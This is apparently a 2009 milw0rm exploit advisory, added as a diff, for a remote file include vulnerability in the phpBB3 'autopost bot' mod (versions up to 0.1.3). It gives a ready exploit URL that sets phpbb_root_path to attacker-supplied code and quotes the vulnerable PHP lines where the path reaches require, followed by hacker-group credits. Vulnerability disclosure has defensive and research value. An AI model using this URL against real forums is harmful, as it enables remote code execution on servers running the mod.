@@ -1,0 +1,75 @@
+phpBB 3 (autopost bot mod <= 0.1.3) Remote File Include Vulnerability
+
+Vulnerability author: Kacper
+
+Greetz: all DEVIL TEAM forum members.
+
+
+Author Website: http://devilteam.pl/
+                http://polskihacking.pl/
+
+
+
+Mod Description:
+This mod automatically post content from RSS feed into destination forum.
+MOD Download: http://phpbb3.smika.net/
+Demo: http://phpbb3.smika.net
+
+dont work when php5 or newest.
+
+Vulnerability:
+
+http://site.cz/forum_path/includes/functions_lastrss_autopost.php?config[lastrss_ap_enabled]=1&phpbb_root_path=[evil_code]
+
+------------------------------------------------------------------
+
+Bad codE:
+
+includes/functions_lastrss_autopost.php - line 204 - 240:
+
+[code]
+if($config['lastrss_ap_enabled'])                                        <-----{1}
+{
+  // init & setup lastrss
+  // $rss can be already initiated by lastRSS agregator mod by SmiX
+  if(!isset($rss))                                                       <-----{2}
+  {
+    require $phpbb_root_path . 'includes/class_lastrss.' . $phpEx;                                   <-----{3}
+    $rss = new lastrss;	
+  }
+  // init/change settings for lastrss autopost bot
+  $rss->cache_time = 0;                                         // not used in this mod
+  $rss->items_limit = $config['lastrss_ap_items_limit'];        // default limit of items to post
+  $rss->type = $config['lastrss_type'];                         // connection type (fopen / curl)
+
+  // init lastRSS autopost MOD !
+  // check if we have some feeds in database to check
+  $sql = 'SELECT *
+		      FROM ' . LASTRSS_AP_TABLE . '
+		      WHERE next_check < "' . time() . '" AND enabled = "1"';
+  $result	= $db->sql_query($sql);
+	$row = $db->sql_fetchrow($result);
+	$db->sql_freeresult($result);
+  // so do we have some feeds to post ?
+  if(sizeof($row) > 0)
+  {
+    // we are already sure, that at least one feed exists!
+    $feed = get_next_feed_to_post(); 
+  }
+
+  // do we have some feed data ?
+  if (isset($feed) && (sizeof($feed) > 0))
+  {  
+    // we are sure, we have feed info for checking the feed!
+    autopost_init($feed);
+  }
+}
+?>
+[/code]
+
+------------------------------------------------------------------
+
+Zapraszam na forum DEVIL TEAM, 
+google:"DEVIL TEAM" lub http://6189.pl, http://devilteam.pl
+
+# milw0rm.com [2009-02-20]
